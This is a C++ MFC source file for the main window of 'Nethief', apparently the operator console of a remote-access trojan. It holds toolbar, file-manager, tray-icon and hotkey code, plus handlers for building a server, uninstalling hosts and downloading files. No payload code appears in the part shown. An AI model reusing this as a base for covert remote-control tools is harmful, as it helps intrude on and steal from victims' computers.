//Download by http://www.NewXing.com
// MainFrm.cpp : implementation of the CMainFrame class
//
#include "stdafx.h"
#include "Nethief.h"

#include "NethiefDoc.h"
#include "MainFrm.h"
#include "TipOfTheDayDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_COMMAND(ID_HELP_TIPOFTHEDAY, OnHelpTipoftheday)
	ON_COMMAND(ID_TOOLBAR_FILEMANAGER, OnToolbarFilemanager)
	ON_COMMAND(ID_TOOLBAR_COMMUNITY, OnToolbarCommunity)
	ON_COMMAND(ID_TOOLBAR_VIEW, OnToolbarView)
	ON_COMMAND(ID_TOOLBAR_REFRESH, OnToolbarRefresh)
	ON_COMMAND(ID_TOOLBAR_PASTE, OnToolbarPaste)
	ON_COMMAND(ID_TOOLBAR_NEWFOLDER, OnToolbarNewfolder)
	ON_COMMAND(ID_TOOLBAR_FINDFILE, OnToolbarFindfile)
	ON_COMMAND(ID_TOOLBAR_DELETE, OnToolbarDelete)
	ON_COMMAND(ID_TOOLBAR_CUT, OnToolbarCut)
	ON_COMMAND(ID_TOOLBAR_COPY, OnToolbarCopy)
	ON_COMMAND(ID_TOOLBAR_BACK, OnToolbarBack)
	ON_COMMAND(ID_TOOLBAR_NEWFILE, OnToolbarNewfile)
	ON_COMMAND(ID_TOOLBAR_RUN, OnToolbarRun)
	ON_COMMAND(ID_MENU_FILE_RUN, OnMenuFileRun)
	ON_COMMAND(ID_MENU_FILE_RENAME, OnMenuFileRename)
	ON_COMMAND(ID_MENU_CONSOLE_TAB, OnMenuConsoleTab)
	ON_UPDATE_COMMAND_UI(ID_INDICATOR_PROGRESS,OnUpdateIndicatorProgress)
	ON_COMMAND(ID_TOOLBAR_SELECTALL, OnToolbarSelectall)
	ON_COMMAND(ID_TOOLBAR_REVERSESELECT, OnToolbarReverseselect)
	ON_WM_SIZE()
	ON_MESSAGE(WM_SYSTRAY,OnSystray)
	ON_COMMAND(ID_SYSTRAYMENU_WINDOW, OnSystraymenuWindow)
	ON_MESSAGE(WM_HOTKEY,OnHotKey)
	ON_COMMAND(ID_MENU_CONSOLE_LOGON, OnMenuConsoleLogon)
	ON_UPDATE_COMMAND_UI(ID_SYSTRAYMENU_HIDE, OnUpdateSystraymenuHide)
	ON_COMMAND(ID_SYSTRAYMENU_HIDE, OnSystraymenuHide)
	ON_COMMAND(ID_TOOLBAR_DELETEHOST, OnToolbarDeletehost)
	ON_COMMAND(ID_TOOLBAR_BUILDSERVER, OnToolbarBuildserver)
	ON_COMMAND(ID_HELP_README, OnHelpReadme)
	ON_COMMAND(ID_HELP_HOMEPAGE, OnHelpHomepage)
	ON_COMMAND(ID_HELP_EMAIL, OnHelpEmail)
	ON_COMMAND(ID_HELP_UPDATE, OnHelpUpdate)
	ON_COMMAND(ID_TOOLBAR_DISCONNECT, OnToolbarDisconnect)
	ON_COMMAND(ID_TOOLBAR_STOP, OnToolbarStop)
	ON_COMMAND(ID_MENU_NET_OPTION, OnMenuNetOption)
	ON_WM_SETCURSOR()
	ON_MESSAGE(WM_WORKTHREAD,OnWorkThread)
	ON_MESSAGE(WM_SOCKET,OnSocket)
	ON_COMMAND(ID_TOOLBAR_PROPERTY, OnToolbarProperty)
	ON_COMMAND(ID_MENU_NET_UNINSTALL, OnMenuNetUninstall)
	ON_COMMAND(ID_MENU_NET_NOTE, OnMenuNetNote)
	ON_COMMAND(ID_MENU_NET_DOWNLOAD, OnMenuNetDownload)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_INDICATOR_OFFLINE,
	ID_INDICATOR_BUSY,
	ID_INDICATOR_PROGRESS,
	ID_SEPARATOR           // status line indicator
};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	m_nStartup=0;

	m_hCursor=::LoadCursor(NULL,IDC_APPSTARTING);
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	//////////////////从INI中读出一些设置////////////////////////////
	m_bIsFileManager=GetINIfileInt("Main Window Placement","IsFileManager");//得到窗口状态
	m_cxOldColumnPos1=GetINIfileInt("Main Window Placement","SplitterBarPos");//分割栏初始化位置
	m_cxOldColumnPos2=0;
	m_bIsHideIcon=GetINIfileInt("Main Window Placement","IsHideIcon");
	/////////////////////////////////////////////////////////////////
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	m_pTreeView=(CMyTreeView*)m_wndSplitter.GetPane(0,0);
	m_pListView=(CMyListView*)m_wndSplitter.GetPane(0,1);
	m_pFormView=(CMyFormView*)m_wndSplitter.GetPane(0,2);
	//状态栏////////////////////////////////////////	
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}
	m_wndStatusBar.SetPaneInfo(
		m_wndStatusBar.CommandToIndex(ID_INDICATOR_OFFLINE),
		ID_INDICATOR_OFFLINE,SBPS_NORMAL|SBPS_DISABLED,14);
	m_wndStatusBar.SetPaneInfo(
		m_wndStatusBar.CommandToIndex(ID_INDICATOR_BUSY),
		ID_INDICATOR_BUSY,SBPS_NORMAL|SBPS_DISABLED,14);
	m_wndStatusBar.SetPaneInfo(
		m_wndStatusBar.CommandToIndex(ID_INDICATOR_PROGRESS),
		ID_INDICATOR_PROGRESS,SBPS_NORMAL|SBPS_DISABLED,191);
	m_wndStatusBar.SetPaneStyle(m_wndStatusBar.CommandToIndex(ID_SEPARATOR),
		SBPS_STRETCH);
	//网络操作工具栏///////////////////////////////////////////////////////////////
	if(!m_wndNetToolBar.Create(this)||
		!m_wndNetToolBar.LoadToolBar(IDR_NETTOOLBAR))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;      // fail to create
	}
	m_wndNetToolBar.SetWindowText("网络");
	m_wndNetToolBar.SetBarStyle(m_wndNetToolBar.GetBarStyle() |
		CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC);
	m_wndNetToolBar.ModifyStyle(0,TBSTYLE_FLAT);	//设置工具栏为平面格式
	m_wndNetToolBar.EnableDocking(CBRS_ALIGN_ANY);
	EnableDocking(CBRS_ALIGN_ANY);
	//////////////////////////////////////////////
	CBitmap NetToolBarBitmap;
	NetToolBarBitmap.LoadBitmap(IDB_NETTOOLBAR);
	m_NetToolBarImageList.Create(32,32,ILC_COLOR32|ILC_MASK,4,1);
	m_NetToolBarImageList.Add(&NetToolBarBitmap,RGB(255,0,255));
	m_wndNetToolBar.GetToolBarCtrl().SetImageList(&m_NetToolBarImageList);

	CBitmap NetToolBarHotBitmap;
	NetToolBarHotBitmap.LoadBitmap(IDB_NETTOOLBAR_HOT);
	m_NetToolBarHotImageList.Create(32,32,ILC_COLOR32|ILC_MASK,4,1);
	m_NetToolBarHotImageList.Add(&NetToolBarHotBitmap,RGB(255,0,255));
	m_wndNetToolBar.GetToolBarCtrl().SetHotImageList(&m_NetToolBarHotImageList);
	//////////////////////////////////////////////
	CRect rect;//设置窗口正常显示时的位置
	rect.left=GetINIfileInt("Main Window Placement","NetToolBar.left");
	rect.top=GetINIfileInt("Main Window Placement","NetToolBar.top");
	rect.right=GetINIfileInt("Main Window Placement","NetToolBar.right");
	rect.bottom=GetINIfileInt("Main Window Placement","NetToolBar.bottom");
	ClientToScreen(&rect);
	DockControlBar(&m_wndNetToolBar,(UINT)0,&rect);
	//控制台工具栏///////////////////////////////////////////////////////////////////
	if(!m_wndConsoleToolBar.Create(this)||
		!m_wndConsoleToolBar.LoadToolBar(IDR_CONSOLETOOLBAR))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;      // fail to create
	}
	m_wndConsoleToolBar.SetWindowText("主控");
	m_wndConsoleToolBar.SetBarStyle(m_wndConsoleToolBar.GetBarStyle() |
		CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC);
	m_wndConsoleToolBar.ModifyStyle(0,TBSTYLE_FLAT);	//设置工具栏为平面格式
	//////////////////////////////////////////////
	m_pWndConsoleToolBarCtrl=&m_wndConsoleToolBar.GetToolBarCtrl();

	CBitmap ConsoleToolBarBitmap;
	ConsoleToolBarBitmap.LoadBitmap(IDB_CONSOLETOOLBAR);
	m_ConsoleToolBarImageList.Create(32,32,ILC_COLOR32|ILC_MASK,2,1);
	m_ConsoleToolBarImageList.Add(&ConsoleToolBarBitmap,RGB(255,0,255));
	m_pWndConsoleToolBarCtrl->SetImageList(&m_ConsoleToolBarImageList);

	CBitmap ConsoleToolBarHotBitmap;
	ConsoleToolBarHotBitmap.LoadBitmap(IDB_CONSOLETOOLBAR_HOT);
	m_ConsoleToolBarHotImageList.Create(32,32,ILC_COLOR32|ILC_MASK,2,1);
	m_ConsoleToolBarHotImageList.Add(&ConsoleToolBarHotBitmap,RGB(255,0,255));
	m_pWndConsoleToolBarCtrl->SetHotImageList(&m_ConsoleToolBarHotImageList);
	//////////////////////////////////////////////
	m_wndConsoleToolBar.SetButtonStyle(0,TBBS_CHECKBOX|TBBS_GROUP);
	m_wndConsoleToolBar.SetButtonStyle(1,TBBS_CHECKBOX|TBBS_GROUP);

	m_wndConsoleToolBar.EnableDocking(CBRS_ALIGN_ANY);
	EnableDocking(CBRS_ALIGN_ANY);
	//////////////////////////////////////////////////////////////
	rect.left=GetINIfileInt("Main Window Placement","ConsoleToolBar.left");
	rect.top=GetINIfileInt("Main Window Placement","ConsoleToolBar.top");
	rect.right=GetINIfileInt("Main Window Placement","ConsoleToolBar.right");
	rect.bottom=GetINIfileInt("Main Window Placement","ConsoleToolBar.bottom");

	ClientToScreen(&rect);
	DockControlBar(&m_wndConsoleToolBar,(UINT)0,&rect);

	if(m_bIsFileManager)
	{
		SetActivePane(0,0);//设置活动视为TreeView

		m_pWndConsoleToolBarCtrl->CheckButton(ID_TOOLBAR_FILEMANAGER,TRUE);
	    CMenu *pMenu=GetMenu()->GetSubMenu(0);
		pMenu->CheckMenuRadioItem(0,1,0,MF_BYPOSITION);
	}
	else
	{
		SetActivePane(0,2);//设置活动视为FormView

		m_pWndConsoleToolBarCtrl->CheckButton(ID_TOOLBAR_COMMUNITY,TRUE);
		CMenu *pMenu=GetMenu()->GetSubMenu(0);
		pMenu->CheckMenuRadioItem(0,1,1,MF_BYPOSITION);
		///////////////////////////////////////////////////
		m_wndSplitter.SetColumnInfo(0,0,0);
		m_wndSplitter.SetColumnInfo(1,0,0);
		m_wndSplitter.RecalcLayout();
	}
	//文件操作工具栏////////////////////////////////////////////////////////////////
	if(!m_wndFileToolBar.Create(this)||
		!m_wndFileToolBar.LoadToolBar(IDR_FILETOOLBAR))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;      // fail to create
	}
	m_wndFileToolBar.SetWindowText("文件");
	m_wndFileToolBar.SetBarStyle(m_wndFileToolBar.GetBarStyle() |
		CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC);
	m_wndFileToolBar.ModifyStyle(0,TBSTYLE_FLAT);	//设置工具栏为平面格式
	//////////////////////////////////////////////
	CBitmap FileToolBarBitmap;
	FileToolBarBitmap.LoadBitmap(IDB_FILETOOLBAR);
	m_FileToolBarImageList.Create(32,32,ILC_COLOR32|ILC_MASK,12,1);
	m_FileToolBarImageList.Add(&FileToolBarBitmap,RGB(255,0,255));
	m_wndFileToolBar.GetToolBarCtrl().SetImageList(&m_FileToolBarImageList);

	CBitmap FileToolBarHotBitmap;
	FileToolBarHotBitmap.LoadBitmap(IDB_FILETOOLBAR_HOT);
	m_FileToolBarHotImageList.Create(32,32,ILC_COLOR32|ILC_MASK,12,1);
	m_FileToolBarHotImageList.Add(&FileToolBarHotBitmap,RGB(255,0,255));
	m_wndFileToolBar.GetToolBarCtrl().SetHotImageList(&m_FileToolBarHotImageList);
	//////////////////////////////////////////////
	m_wndFileToolBar.EnableDocking(CBRS_ALIGN_ANY);
	EnableDocking(CBRS_ALIGN_ANY);
	
	rect.left=GetINIfileInt("Main Window Placement","FileToolBar.left");
	rect.top=GetINIfileInt("Main Window Placement","FileToolBar.top");
	rect.right=GetINIfileInt("Main Window Placement","FileToolBar.right");
	rect.bottom=GetINIfileInt("Main Window Placement","FileToolBar.bottom");

	ClientToScreen(&rect);
	DockControlBar(&m_wndFileToolBar,(UINT)0,&rect);
	//////////////////////////////////////////////////////////////////
	RegisterHotKey(m_hWnd,0,MOD_ALT,0xC0);//Alt+`
	//////////////////////////////////////////////////////////////////
	m_pDoc=(CNethiefDoc*)GetActiveDocument();
	m_pDoc->OnInitial();

	return 0;
}

BOOL CMainFrame::OnCreateClient( LPCREATESTRUCT lpcs,
	CCreateContext* pContext)
{
	m_wndSplitter.CreateStatic(this,1,3);//水平分割三个窗口
	m_wndSplitter.CreateView(0,0,RUNTIME_CLASS(CMyTreeView),
		CSize(m_cxOldColumnPos1,0),pContext);
	m_wndSplitter.CreateView(0,1,RUNTIME_CLASS(CMyListView),
		CSize(m_cxOldColumnPos2,0),pContext);
	m_wndSplitter.CreateView(0,2,RUNTIME_CLASS(CMyFormView),
		CSize(0,0),pContext);

	return TRUE;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style&=~FWS_ADDTOTITLE;
	CNethiefApp* app=(CNethiefApp*)AfxGetApp();
	cs.lpszName=app->m_strVersion;

	return CFrameWnd::PreCreateWindow(cs);
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

void CMainFrame::OnMenuConsoleTab() 
{
	// TODO: Add your command handler code here
	if(m_bIsFileManager)
	{
		OnToolbarCommunity();
	}
	else
	{
		OnToolbarFilemanager();
	}
}

void CMainFrame::OnToolbarFilemanager() 
{
	// TODO: Add your command handler code here
	if(m_bIsFileManager)
		return;
	m_pWndConsoleToolBarCtrl->CheckButton(ID_TOOLBAR_FILEMANAGER,TRUE);
    CMenu *pMenu=GetMenu()->GetSubMenu(0);
	pMenu->CheckMenuRadioItem(0,1,0,MF_BYPOSITION);

	m_bIsFileManager=TRUE;
	m_wndSplitter.SetColumnInfo(0,m_cxOldColumnPos1,0);
	m_wndSplitter.SetColumnInfo(1,m_cxOldColumnPos2,0);
	m_wndSplitter.RecalcLayout();
	SetActivePane(0,0);//设置活动视为TreeView
}

void CMainFrame::OnToolbarCommunity() 
{
	// TODO: Add your command handler code here
	if(!m_bIsFileManager)
		return;
	m_pWndConsoleToolBarCtrl->CheckButton(ID_TOOLBAR_COMMUNITY,TRUE);
    CMenu *pMenu=GetMenu()->GetSubMenu(0);
	pMenu->CheckMenuRadioItem(0,1,1,MF_BYPOSITION);

	m_bIsFileManager=FALSE;
	int cxMin;
	m_wndSplitter.GetColumnInfo(0,m_cxOldColumnPos1,cxMin);
	m_wndSplitter.GetColumnInfo(1,m_cxOldColumnPos2,cxMin);
	m_wndSplitter.SetColumnInfo(0,0,0);
	m_wndSplitter.SetColumnInfo(1,0,0);
	m_wndSplitter.RecalcLayout();
	SetActivePane(0,2);//设置活动视为FormView
}

void CMainFrame::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	m_pDoc->OnTimer(nIDEvent);//转到CNethiefDoc的函数
}

void CMainFrame::ActivateFrame(int nCmdShow) 
{
	// TODO: Add your specialized code here and/or call the base class
	//得到窗口位置及是否最大化
	BOOL bIsMax=GetINIfileInt("Main Window Placement","IsMax");
	if(bIsMax)//如果是最大化
		CFrameWnd::ActivateFrame(SW_SHOWMAXIMIZED);
	WINDOWPLACEMENT wndpl;
	ZeroMemory(&wndpl,sizeof(WINDOWPLACEMENT));
	wndpl.ptMaxPosition=CPoint(-4,-4);

	CRect rect;//设置窗口正常显示时的位置
	rect.left=GetINIfileInt("Main Window Placement","left");
	rect.top=GetINIfileInt("Main Window Placement","top");
	rect.right=GetINIfileInt("Main Window Placement","right");
	rect.bottom=GetINIfileInt("Main Window Placement","bottom");
	wndpl.rcNormalPosition=rect;

	SetWindowPlacement(&wndpl); 
	if(!bIsMax)
		CFrameWnd::ActivateFrame(nCmdShow);
}

void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	WINDOWPLACEMENT wndpl;
	GetWindowPlacement(&wndpl);

	if(wndpl.flags==WPF_RESTORETOMAXIMIZED)//记录窗口是否最大化
		WriteINIfileInt("Main Window Placement","IsMax",1);
	else
		WriteINIfileInt("Main Window Placement","IsMax",0);
	CRect rect;
	rect=wndpl.rcNormalPosition;//记录正常显示时的窗口位置
	WriteINIfileInt("Main Window Placement","left",rect.left);
	WriteINIfileInt("Main Window Placement","top",rect.top);
	WriteINIfileInt("Main Window Placement","right",rect.right);
	WriteINIfileInt("Main Window Placement","bottom",rect.bottom);
	//记录窗口状态
	WriteINIfileInt("Main Window Placement","IsFileManager",m_bIsFileManager);
	//记录分割栏位置
	if(m_bIsFileManager)
	{
		int cxMin;
		m_wndSplitter.GetColumnInfo(0,m_cxOldColumnPos1,cxMin);
	}
	WriteINIfileInt("Main Window Placement","SplitterBarPos",m_cxOldColumnPos1);
	/////////////////////////////////////////////////////////////
	m_wndConsoleToolBar.GetWindowPlacement(&wndpl);
	rect=wndpl.rcNormalPosition;//记录正常显示时的窗口位置
	WriteINIfileInt("Main Window Placement","ConsoleToolBar.left",rect.left);
	WriteINIfileInt("Main Window Placement","ConsoleToolBar.top",rect.top);
	WriteINIfileInt("Main Window Placement","ConsoleToolBar.right",rect.right);
	WriteINIfileInt("Main Window Placement","ConsoleToolBar.bottom",rect.bottom);
	
	m_wndFileToolBar.GetWindowPlacement(&wndpl);
	rect=wndpl.rcNormalPosition;//记录正常显示时的窗口位置
	WriteINIfileInt("Main Window Placement","FileToolBar.left",rect.left);
	WriteINIfileInt("Main Window Placement","FileToolBar.top",rect.top);
	WriteINIfileInt("Main Window Placement","FileToolBar.right",rect.right);
	WriteINIfileInt("Main Window Placement","FileToolBar.bottom",rect.bottom);

	m_wndNetToolBar.GetWindowPlacement(&wndpl);
	rect=wndpl.rcNormalPosition;//记录正常显示时的窗口位置
	WriteINIfileInt("Main Window Placement","NetToolBar.left",rect.left);
	WriteINIfileInt("Main Window Placement","NetToolBar.top",rect.top);
	WriteINIfileInt("Main Window Placement","NetToolBar.right",rect.right);
	WriteINIfileInt("Main Window Placement","NetToolBar.bottom",rect.bottom);

	WriteINIfileInt("Main Window Placement","IsHideIcon",m_bIsHideIcon);
	////////////////////////////////////////////////////////////////
	UnregisterHotKey(m_hWnd,0);
	////////////////////////////////////////////////////////////////
	m_pDoc->OnClose();

	CFrameWnd::OnClose();
}

void CMainFrame::OnHelpTipoftheday()//显示每日一帖
{
	// TODO: Add your command handler code here
	CTipOfTheDayDlg dlg;
	dlg.DoModal();	
}
////////////////////////////工具栏响应///////////////////////////////////
void CMainFrame::OnToolbarNewfile() 
{
	// TODO: Add your command handler code here
	if(!(IsActivePane(0,0)||IsActivePane(0,1)))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
	SetActivePane(0,1);
    m_pDoc->OnToolbarNewfile();
}

void CMainFrame::OnToolbarNewfolder() 
{
	// TODO: Add your command handler code here
	if(!(IsActivePane(0,0)||IsActivePane(0,1)))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
	SetActivePane(0,1);
    m_pDoc->OnToolbarNewfolder();
}
//////////////////////////////////////////////////

void CMainFrame::OnToolbarBack() 
{
	// TODO: Add your command handler code here
	if(!(IsActivePane(0,0)||IsActivePane(0,1)))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
    m_pDoc->OnToolbarBack();
}

void CMainFrame::OnToolbarRefresh() 
{
	// TODO: Add your command handler code here
	if(!(IsActivePane(0,0)||IsActivePane(0,1)))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
    m_pDoc->OnToolbarRefresh();
}

void CMainFrame::OnToolbarFindfile() 
{
	// TODO: Add your command handler code here
	if(!(IsActivePane(0,0)||IsActivePane(0,1)))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
	m_pDoc->OnToolbarFindfile();
}
//////////////////////////////////////////////////

void CMainFrame::OnToolbarCut() 
{
	// TODO: Add your command handler code here
	if(IsActivePane(0,0))//如果是TreeView
	{
		m_pDoc->OnToolbarCut(TRUE);
		return;
	}
	if(IsActivePane(0,1))//如果是ListView
	{
		m_pDoc->OnToolbarCut(FALSE);
		return;
	}
	MessageBeep(0xFFFFFFFF);//如果都不是	
}

void CMainFrame::OnToolbarCopy() 
{
	// TODO: Add your command handler code here
	if(IsActivePane(0,0))//如果是TreeView
	{
		m_pDoc->OnToolbarCopy(TRUE);
		return;
	}
	if(IsActivePane(0,1))//如果是ListView
	{
		m_pDoc->OnToolbarCopy(FALSE);
		return;
	}
	MessageBeep(0xFFFFFFFF);//如果都不是	
}

void CMainFrame::OnToolbarPaste() 
{
	// TODO: Add your command handler code here
	if(!(IsActivePane(0,0)||IsActivePane(0,1)))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
    m_pDoc->OnToolbarPaste();
}
///////////////////////////////////////////////

void CMainFrame::OnMenuFileRun() 
{
	// TODO: Add your command handler code here
	if(!(IsActivePane(0,1)))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
	m_pDoc->OnMenuFileRun();
}

void CMainFrame::OnToolbarRun() 
{
	// TODO: Add your command handler code here
	if(!(IsActivePane(0,0)||IsActivePane(0,1)))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
    m_pDoc->OnToolbarRun();
}

void CMainFrame::OnMenuFileRename() 
{
	// TODO: Add your command handler code here
	if(IsActivePane(0,0))//如果是TreeView
	{
		m_pDoc->OnTreeMenuFileRename();
		return;
	}
	if(IsActivePane(0,1))//如果是ListView
	{
		m_pDoc->OnListMenuFileRename();
		return;
	}
	MessageBeep(0xFFFFFFFF);//如果都不是	
}

void CMainFrame::OnToolbarView() 
{
	// TODO: Add your command handler code here
	if(!(IsActivePane(0,1)))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
	m_pDoc->OnToolbarView();
}

void CMainFrame::OnToolbarDelete() 
{
	// TODO: Add your command handler code here
	if(IsActivePane(0,0))//如果是TreeView
	{
		m_pDoc->OnTreeToolbarDelete();
		return;
	}
	if(IsActivePane(0,1))//如果是ListView
	{
		m_pDoc->OnListToolbarDelete();
		return;
	}
	MessageBeep(0xFFFFFFFF);//如果都不是
}

void CMainFrame::OnToolbarProperty() 
{
	// TODO: Add your command handler code here
	if(IsActivePane(0,0))//如果是TreeView
	{
		m_pDoc->OnToolbarProperty(TRUE);
		return;
	}
	if(IsActivePane(0,1))//如果是ListView
	{
		m_pDoc->OnToolbarProperty(FALSE);
		return;
	}
	MessageBeep(0xFFFFFFFF);//如果都不是	
}

void CMainFrame::OnToolbarSelectall() 
{
	// TODO: Add your command handler code here
	if(!(IsActivePane(0,0)||IsActivePane(0,1)))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
	SetActivePane(0,1);
    m_pDoc->OnToolbarSelectall();
}

void CMainFrame::OnToolbarReverseselect() 
{
	// TODO: Add your command handler code here
	if(!(IsActivePane(0,0)||IsActivePane(0,1)))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
	SetActivePane(0,1);
    m_pDoc->OnToolbarReverseselect();
}
///////////////////////////////////////////////////////////////////////////////

BOOL CMainFrame::IsActivePane(int nRow,int nCol)
{
	int nRowTemp;
	int nColTemp;
	m_wndSplitter.GetActivePane(&nRowTemp,&nColTemp);
	if(nRowTemp==nRow&&nColTemp==nCol)
		return TRUE;
	else
		return FALSE;
}

void CMainFrame::SetActivePane(int nRow,int nCol)
{
	m_wndSplitter.SetActivePane(nRow,nCol);
}

void CMainFrame::OnUpdateIndicatorProgress(CCmdUI *pCmdUI)
{
	m_pDoc->OnUpdateIndicatorProgress(pCmdUI);
}

//////////////////INI文件操作函数/////////////////
int CMainFrame::GetINIfileInt(LPCTSTR lpSectionName, LPCTSTR lpKeyName)
{
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('.'));  //找到
	exeFullPath=exeFullPath+".INI";  //源文件名
	return GetPrivateProfileInt(lpSectionName,lpKeyName,-1,
		exeFullPath.GetBufferSetLength(MAX_PATH));
}

BOOL CMainFrame::WriteINIfileInt(LPCTSTR lpSectionName, LPCTSTR lpKeyName, INT nValue)
{
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('.'));  //找到
	exeFullPath=exeFullPath+".INI";  //源文件名
	CString strValue;               
	strValue.Format("%d",nValue);   //把整型转换成字符型
	return WritePrivateProfileString(lpSectionName,lpKeyName,
		strValue.GetBufferSetLength(strValue.GetLength()),
		exeFullPath.GetBufferSetLength(MAX_PATH));
}
//////////////////////////////////////////////////////////

void CMainFrame::OnSize(UINT nType, int cx, int cy)
{
	CFrameWnd::OnSize(nType, cx, cy);
	// TODO: Add your message handler code here
	if(m_nStartup<1)
	{
		m_nStartup++;
		return;
	}
	m_pDoc->SetIndicatorRect();

	if(nType==SIZE_MINIMIZED)
	{
		ShowWindow(SW_HIDE);
		if(m_bIsHideIcon)
		{
			NOTIFYICONDATA tnd;
			tnd.cbSize=sizeof(NOTIFYICONDATA);
			tnd.hWnd=AfxGetMainWnd()->m_hWnd;
			tnd.uID=IDR_MAINFRAME;//保证删除的是我们的图标
			Shell_NotifyIcon(NIM_DELETE,&tnd);
		}
	}
}

void CMainFrame::OnSystray(WPARAM wParam,LPARAM lParam)
{
	UINT uMouseMsg;//鼠标动作
	uMouseMsg=(UINT)lParam;
	if(uMouseMsg==WM_LBUTTONDOWN)//如果是单击左键
	{
		AfxGetMainWnd()->SetForegroundWindow(); 
		OnSystraymenuWindow();
		AfxGetMainWnd()->PostMessage(WM_NULL,0,0);
	}
	if(uMouseMsg==WM_RBUTTONDOWN)
	{
		AfxGetMainWnd()->SetForegroundWindow(); 

		CMenu menu;//弹出Popup菜单
		menu.LoadMenu(IDR_SYSTRAYMENU);
		CMenu* pPopup=menu.GetSubMenu(0);
		pPopup->SetDefaultItem(ID_SYSTRAYMENU_WINDOW);

		CPoint Point;
		GetCursorPos(&Point);
		pPopup->TrackPopupMenu(TPM_LEFTALIGN,
			Point.x,Point.y,AfxGetMainWnd(),NULL);
		AfxGetMainWnd()->PostMessage(WM_NULL,0,0);
	}
}

void CMainFrame::OnSystraymenuWindow() 
{
	// TODO: Add your command handler code here
	if(IsIconic())
	{
		ShowWindow(SW_RESTORE);
		if(m_bIsHideIcon)
		{
			NOTIFYICONDATA tnd;
			tnd.cbSize=sizeof(NOTIFYICONDATA);
			tnd.hWnd=AfxGetMainWnd()->m_hWnd;
			tnd.uID=IDR_MAINFRAME;
			tnd.uFlags=NIF_MESSAGE|NIF_ICON|NIF_TIP;
			tnd.uCallbackMessage=WM_SYSTRAY;
			if(m_pDoc->m_bIsOnline)
			{
				tnd.hIcon=AfxGetApp()->LoadIcon(IDI_SYSTRAY);
				CString strTip="网络神偷"+m_pDoc->m_strServerNum;
				strcpy(tnd.szTip,(LPCSTR)strTip);
			}
			else
			{
				if(m_pDoc->m_bLogoning)
				{
					tnd.hIcon=AfxGetApp()->LoadIcon(IDI_SYSTRAY);
					strcpy(tnd.szTip,"网络神偷[正在登录...]");
				}
				else
				{
					tnd.hIcon=AfxGetApp()->LoadIcon(IDI_SYSTRAY1);
					strcpy(tnd.szTip,"网络神偷[脱机]");
				}
			}
			Shell_NotifyIcon(NIM_ADD,&tnd);
		}
		Sleep(50);
		SetForegroundWindow();
	}
	else
	{
		if(AfxGetMainWnd()==GetForegroundWindow())
		{
			ShowWindow(SW_SHOWMINIMIZED);
		}
		else
		{
			SetForegroundWindow();
		}
	}
}

void CMainFrame::OnHotKey(WPARAM wParam,LPARAM lParam)
{
	int nIDHotKey=(int)wParam; //产生消息的热键ID
	if(nIDHotKey==0)
	{
		OnSystraymenuWindow();
	}
}

void CMainFrame::OnMenuConsoleLogon() 
{
	// TODO: Add your command handler code here
	m_pDoc->OnMenuConsoleLogon();
}

void CMainFrame::OnUpdateSystraymenuHide(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->SetCheck(m_bIsHideIcon);
}

void CMainFrame::OnSystraymenuHide() 
{
	// TODO: Add your command handler code here
	m_bIsHideIcon=!m_bIsHideIcon;
	if(IsIconic())
	{
		NOTIFYICONDATA tnd;
		tnd.cbSize=sizeof(NOTIFYICONDATA);
		tnd.hWnd=AfxGetMainWnd()->m_hWnd;
		tnd.uID=IDR_MAINFRAME;//保证删除的是我们的图标
		Shell_NotifyIcon(NIM_DELETE,&tnd);
	}
}
///////////////网络工具栏/////////////////////
void CMainFrame::OnToolbarDeletehost()
{
